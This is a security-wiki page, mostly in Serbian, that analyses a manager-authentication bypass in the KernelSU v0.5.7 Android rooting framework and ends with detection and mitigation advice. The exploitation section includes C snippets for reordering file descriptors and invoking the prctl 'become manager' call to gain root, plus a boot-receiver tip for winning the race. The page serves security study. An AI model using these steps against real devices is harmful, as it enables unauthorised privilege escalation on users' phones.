# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting framework-ovi kao što su KernelSU, APatch i SKRoot patch-uju ili hook-uju Android/Linux kernel i izlažu privilegovanu funkcionalnost neprivilegovanoj userspace manager aplikaciji. Magisk je zasebno obrađen u nastavku zato što je CVE-2024-48336 uključivao učitavanje koda na strani managera, a ne ovaj KernelSU syscall put.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Ova stranica apstrahuje tehnike i probleme otkrivene u javnim istraživanjima (naročito Zimperium-ovoj analizi KernelSU v0.5.7) kako bi i red i blue timovi razumeli attack surface, exploitation primitive i robusne mitigacije.<sup>[[1]](#references)</sup>

---
## Arhitektonski obrazac: syscall-hooked manager kanal

- U KernelSU v0.5.7, kernel hook na `prctl` prima magic vrednost, ID komande i argumente specifične za komandu iz userspace-a.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Pozivalac najpre zahteva status managera pomoću `CMD_BECOME_MANAGER`. Autorizacija je specifična za komandu: `CMD_GRANT_ROOT` proverava stanje managera/allowlist-e, `CMD_ALLOW_SU` je dostupna samo manageru, a `CMD_SET_SEPOLICY` je u ovoj verziji dostupna samo root-u.<sup>[[2]](#references)[[11]](#references)</sup>
- Ostale komande ispituju verziju/konfiguraciju ili prijavljuju događaje framework-a.<sup>[[2]](#references)</sup>
- Pošto svaka aplikacija može da pozove ovaj syscall interfejs, ispravnost autentikacije managera je kritična.<sup>[[1]](#references)[[2]](#references)</sup>

Primer (KernelSU dizajn):
- Hooked syscall: prctl
- Magic vrednost za preusmeravanje na KernelSU handler: 0xDEADBEEF
- Komande uključuju: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT itd.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Tok autentikacije u KernelSU v0.5.7 (kako je implementiran)

Kada userspace pozove prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU proverava:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Provera prefiksa putanje
- Prosleđena putanja mora počinjati očekivanim prefiksom za UID pozivaoca, npr. /data/data/<pkg> ili /data/user/<id>/<pkg>.
- Referenca: logika provere prefiksa putanje u core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Provera vlasništva
- Vlasnik putanje mora biti UID pozivaoca.
- Referenca: logika provere vlasništva u core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Provera APK potpisa skeniranjem FD tabele
- Iterirati kroz otvorene file descriptor-e pozivajućeg procesa rastućim redosledom descriptor-a.
- Za svaki regularni fajl čija putanja počinje sa `/data/app/` i završava se sa `/base.apk`, zahtevati da putanja sadrži substring paketa izveden iz prosleđene putanje data direktorijuma.
- Verifikovati potpis prvog kandidata koji prođe te provere putanje.
- Parsirati APK v2 potpis i verifikovati ga u odnosu na zvanični sertifikat managera.
- Reference: manager.c (iteriranje kroz FD-ove), apk_sign.c (APK v2 verifikacija).<sup>[[3]](#references)[[4]](#references)</sup>

Ako sve provere prođu, kernel privremeno kešira UID managera; komande dostupne samo manageru zatim prihvataju taj UID, dok ostale komande zadržavaju sopstvene UID ili allowlist provere.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Klasa ranjivosti: verovanje selekciji APK-a izvedenoj iz putanje

KernelSU v0.5.7 ne povezuje rezultat provere potpisa sa identitetom instaliranog paketa iz PackageManager-a. U `manager.c`, provera paketa je samo provera substring-a putanje (`strstr(cwd, pkg)`); zatim se vrši provera potpisa prvog kandidata koji prođe tu proveru. Napadač zato može da postavi autentičan manager APK pod `/data/app/` putanju koja takođe sadrži ime napadačevog paketa i da obezbedi da taj APK bude prvi izabran.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Ovo poverenje kroz indirekciju omogućava neprivilegovanoj aplikaciji da se predstavlja kao manager bez posedovanja ključa za potpisivanje managera.<sup>[[1]](#references)</sup>

Ključne iskorišćene osobine:<sup>[[1]](#references)[[3]](#references)</sup>
- FD skeniranje je uređeno prema indeksu descriptor-a, a provera paketa je provera substring-a putanje, a ne verifikovano povezivanje identiteta paketa sa APK-om.
- open() vraća najniži dostupan FD. Zatvaranjem nižih FD-ova unapred, napadač može da kontroliše redosled.
- Bundled manager APK može biti postavljen pod `/data/app/` na putanji koja sadrži string napadačevog paketa, uz zadržavanje zvaničnog potpisa managera.

---
## Preduslovi napada

Konkretan slučaj za KernelSU v0.5.7 zahteva:<sup>[[1]](#references)[[3]](#references)</sup>

- Uređaj je već rootovan pomoću ranjivog rooting framework-a (npr. KernelSU v0.5.7).
- Napadač može lokalno da izvršava proizvoljan neprivilegovan kod (Android proces aplikacije).
- Za implementaciju v0.5.7, `current->real_parent` mora imati UID 0 (komentar u source-u ovo opisuje kao zahtev da proces bude direktno dete zygote-a); `manager.c` odbija druge parent procese.<sup>[[3]](#references)</sup>
- Pravi manager još nije autentikovan (npr. neposredno nakon reboot-a). Neki framework-ovi keširaju UID managera nakon uspeha; morate pobediti u race-u.<sup>[[1]](#references)</sup>

---
## Skica exploitation-a (KernelSU v0.5.7)

Koraci visokog nivoa (citirani demo video prikazuje javni proof of concept u radu):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Napraviti validnu putanju do sopstvenog direktorijuma sa podacima aplikacije kako bi se zadovoljile provere prefiksa i vlasništva.
2) Postaviti autentičan KernelSU Manager base.apk pod `/data/app/` na putanju koja sadrži string vašeg paketa, a zatim ga otvoriti na FD-u sa nižim brojem od FD-a sopstvenog base.apk-a.
3) Pozvati prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) kako bi provere prošle.
4) Koristiti `CMD_GRANT_ROOT`, zatim `CMD_ALLOW_SU` za trajni su; root-only `CMD_SET_SEPOLICY` pozvati tek nakon dobijanja root-a i samo tamo gde je podržan.

Praktične napomene za korak 2 (FD ordering):<sup>[[1]](#references)</sup>
- Identifikovati FD svog procesa za sopstveni /data/app/*/base.apk prolaskom kroz /proc/self/fd symlink-ove.
- Zatvoriti FD sa niskim brojem (npr. stdin, fd 0) i prvo otvoriti legitimni manager APK kako bi zauzeo fd 0 (ili bilo koji indeks niži od FD-a vašeg base.apk-a).
- Bundlovati legitimni manager APK sa svojom aplikacijom tako da njegova putanja počinje sa `/data/app/`, završava se sa `/base.apk` i sadrži string vašeg paketa. Na primer, putanja unutar `lib` direktorijuma vaše aplikacije može zadovoljiti ove provere.<sup>[[1]](#references)[[3]](#references)</sup>

Primeri isečaka koda (Android/Linux, samo ilustrativno):

Enumerisanje otvorenih FD-ova radi pronalaženja base.apk unosa:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Usmerite FD sa manjim brojem na legitimni manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autentikacija Manager-a putem KernelSU v0.5.7 `prctl` hook-a:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Nakon uspeha, privilegovane komande (primeri):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: promoviše trenutni proces u root
- CMD_ALLOW_SU: dodaje vaš package/UID na allowlist za trajni su
- CMD_SET_SEPOLICY: prilagođava SELinux policy nakon dobijanja root privilegija; KernelSU v0.5.7 proverava UID 0 za ovu komandu.<sup>[[2]](#references)</sup>

Savet za Race/persistence:
- Registrujte BOOT_COMPLETED receiver u AndroidManifest (`RECEIVE_BOOT_COMPLETED`) da se pokrene nakon reboot-a i pokuša authentication pre pravog manager-a; permission autorizuje prijem `ACTION_BOOT_COMPLETED`, ali sama po sebi ne garantuje prioritet pri scheduling-u.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

Za developere framework-a:
- Vežite authentication za package/UID pozivaoca, a ne za proizvoljne FD-ove:
- Razrešite package pozivaoca na osnovu njegovog UID-a i proverite ga u odnosu na signature instaliranog package-a (putem PackageManager-a), umesto skeniranja FD-ova.
- Ako je kernel-only, koristite stabilni identitet pozivaoca (task creds) i proverite ga na stabilnom source of truth-u kojim upravlja init/userspace helper, a ne preko process FD-ova.
- Izbegavajte provere prefiksa putanje kao identiteta; pozivalac ih trivijalno može zadovoljiti.
- Koristite challenge–response zasnovan na nonce-u preko kanala i obrišite svaki keširani identitet manager-a pri boot-u ili tokom ključnih događaja.
- Razmotrite authenticated IPC zasnovan na binder-u umesto preopterećivanja generičkih syscall-ova kada je to izvodljivo.

Za defendere/blue team:
- Detektujte prisustvo rooting framework-a i manager procesa; nadgledajte prctl pozive sa sumnjivim magic constants (npr. 0xDEADBEEF) ako imate kernel telemetry.<sup>[[1]](#references)[[11]](#references)</sup>
- Na managed fleet-ovima blokirajte ili prijavite boot receiver-e iz nepouzdanih package-ova koji brzo pokušavaju privilegovane manager komande nakon boot-a.
- Obezbedite da su uređaji ažurirani na patch-ovane verzije framework-a; poništite keširane manager ID-jeve nakon update-a.

Ograničenja attack-a:<sup>[[1]](#references)[[2]](#references)</sup>
- Utiče samo na uređaje koji su već root-ovani pomoću ranjivog framework-a.
- Obično zahteva reboot/race window pre nego što se legitimni manager authentifikuje (neki framework-ovi keširaju UID manager-a do reset-a).

---
## Related notes across frameworks

- Authentication zasnovan na password-u (npr. istorijski APatch/SKRoot build-ovi) može biti slab ako su password-i guessable/bruteforceable ili ako su validacije neispravne.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Authentication zasnovan na package/signature-u (npr. KernelSU) u principu je jači, ali mora biti vezan za stvarnog pozivaoca, a ne za artefakte izvedene iz putanje i izabrane skeniranjem FD-ova.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 je uticao na build-ove pre Canary 27007 koji su učitavali code iz neproverenog GMS package-a, omogućavajući lokalnoj aplikaciji da izvrši code u Magisk aplikaciji i eskalira do root-a bez interakcije korisnika.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Rootovanje svega zlog: bezbednosne rupe koje bi mogle da ugroze vaš mobilni uređaj](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – authentication provere u core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – iteracija FD-ova, provera package-a i poziv signature-a u manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – APK v2 verification u apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU projekat](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk issue #8279 – Provera da li je GMS system app](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – identifikatori komandi u ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
